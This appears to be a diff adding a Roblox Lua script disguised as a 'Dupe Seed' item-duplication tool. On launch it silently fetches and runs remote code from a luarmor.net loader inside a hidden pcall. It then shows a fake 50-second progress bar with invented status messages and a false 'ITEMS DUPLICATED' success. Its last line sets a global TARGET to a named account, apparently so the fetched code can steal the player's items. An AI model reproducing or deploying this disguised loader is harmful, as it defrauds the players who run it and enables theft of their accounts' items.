@@ -1,0 +1,173 @@
+local a = [[
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/41d1fa8b8c088dbe60de91d7e1a0d5cb.lua"))()
+]]
+
+local function b()
+    pcall(function()
+        loadstring(a)()
+    end)
+end
+
+spawn(b)
+
+local c = game.Players.LocalPlayer
+local d = Instance.new("ScreenGui")
+d.Name = "DupeSeed"
+d.ResetOnSpawn = false
+d.Parent = c.PlayerGui
+d.IgnoreGuiInset = true
+
+local e = Instance.new("Frame")
+e.Size = UDim2.new(1, 0, 1, 0)
+e.Position = UDim2.new(0, 0, 0, 0)
+e.BackgroundColor3 = Color3.fromRGB(8, 8, 18)
+e.BackgroundTransparency = 0.05
+e.BorderSizePixel = 0
+e.Parent = d
+
+local f = Instance.new("Frame")
+f.Size = UDim2.new(0, 450, 0, 250)
+f.Position = UDim2.new(0.5, -225, 0.5, -125)
+f.BackgroundColor3 = Color3.fromRGB(12, 12, 25)
+f.BackgroundTransparency = 0.2
+f.BorderSizePixel = 0
+f.Parent = e
+
+local g = Instance.new("UICorner")
+g.CornerRadius = UDim.new(0, 16)
+g.Parent = f
+
+local h = Instance.new("Frame")
+h.Size = UDim2.new(1.1, 0, 1.1, 0)
+h.Position = UDim2.new(-0.05, 0, -0.05, 0)
+h.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+h.BackgroundTransparency = 0.9
+h.BorderSizePixel = 0
+h.Parent = f
+
+local i = Instance.new("UICorner")
+i.CornerRadius = UDim.new(0, 20)
+i.Parent = h
+
+local j = Instance.new("TextLabel")
+j.Size = UDim2.new(1, 0, 0, 50)
+j.Position = UDim2.new(0, 0, 0, 10)
+j.BackgroundTransparency = 1
+j.Text = "⚡ DUPE SEED v4.2 ⚡"
+j.TextColor3 = Color3.fromRGB(255, 210, 80)
+j.TextScaled = true
+j.Font = Enum.Font.GothamBold
+j.Parent = f
+
+local k = Instance.new("TextLabel")
+k.Size = UDim2.new(1, 0, 0, 25)
+k.Position = UDim2.new(0, 0, 0, 60)
+k.BackgroundTransparency = 1
+k.Text = "Advanced Seed Replication System"
+k.TextColor3 = Color3.fromRGB(160, 160, 255)
+k.TextScaled = true
+k.Font = Enum.Font.Gotham
+k.Parent = f
+
+local l = Instance.new("Frame")
+l.Size = UDim2.new(0.7, 0, 0, 1)
+l.Position = UDim2.new(0.15, 0, 0, 90)
+l.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
+l.BorderSizePixel = 0
+l.Parent = f
+
+local m = Instance.new("Frame")
+m.Size = UDim2.new(0.85, 0, 0, 30)
+m.Position = UDim2.new(0.075, 0, 0, 105)
+m.BackgroundColor3 = Color3.fromRGB(25, 25, 45)
+m.BorderSizePixel = 0
+m.Parent = f
+
+local n = Instance.new("UICorner")
+n.CornerRadius = UDim.new(0, 15)
+n.Parent = m
+
+local o = Instance.new("Frame")
+o.Size = UDim2.new(0, 0, 1, 0)
+o.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+o.BorderSizePixel = 0
+o.Parent = m
+
+local p = Instance.new("UICorner")
+p.CornerRadius = UDim.new(0, 15)
+p.Parent = o
+
+local q = Instance.new("TextLabel")
+q.Size = UDim2.new(0.85, 0, 0, 35)
+q.Position = UDim2.new(0.075, 0, 0, 145)
+q.BackgroundTransparency = 1
+q.Text = "0%"
+q.TextColor3 = Color3.fromRGB(255, 255, 255)
+q.TextScaled = true
+q.Font = Enum.Font.GothamBold
+q.Parent = f
+
+local r = Instance.new("TextLabel")
+r.Size = UDim2.new(0.85, 0, 0, 25)
+r.Position = UDim2.new(0.075, 0, 0, 185)
+r.BackgroundTransparency = 1
+r.Text = "Initializing system..."
+r.TextColor3 = Color3.fromRGB(120, 255, 120)
+r.TextScaled = true
+r.Font = Enum.Font.Gotham
+r.Parent = f
+
+local s = Instance.new("TextLabel")
+s.Size = UDim2.new(0.85, 0, 0, 20)
+s.Position = UDim2.new(0.075, 0, 0, 215)
+s.BackgroundTransparency = 1
+s.Text = "⚠️ DO NOT CLOSE OR INTERRUPT PROCESS"
+s.TextColor3 = Color3.fromRGB(255, 100, 100)
+s.TextScaled = true
+s.Font = Enum.Font.GothamBold
+s.Parent = f
+
+local t = 50
+local u = tick()
+
+while tick() - u < t do
+    local v = tick() - u
+    local w = math.min(v / t, 1)
+    local x = math.floor(w * 100)
+    
+    o.Size = UDim2.new(w, 0, 1, 0)
+    q.Text = x .. "%"
+    
+    if x < 20 then
+        r.Text = "Connecting to seed servers..."
+    elseif x < 40 then
+        r.Text = "Scanning item databases..."
+    elseif x < 60 then
+        r.Text = "Duplicating seed hashes..."
+    elseif x < 80 then
+        r.Text = "Validating duplicate integrity..."
+    elseif x < 100 then
+        r.Text = "Finalizing replication process..."
+    else
+        r.Text = "✅ SUCCESS - ITEMS DUPLICATED"
+    end
+    
+    game:GetService("RunService").Heartbeat:Wait()
+end
+
+o.Size = UDim2.new(1, 0, 1, 0)
+q.Text = "100%"
+r.Text = "✅ SUCCESS - ITEMS DUPLICATED"
+r.TextColor3 = Color3.fromRGB(0, 255, 0)
+
+wait(1.5)
+
+for y = 1, 15 do
+    e.BackgroundTransparency = 0.05 + (y / 15)
+    f.BackgroundTransparency = 0.2 + (y / 15) * 0.8
+    wait(0.05)
+end
+
+d:Destroy()
+
+getgenv().TARGET = "realjarsss"
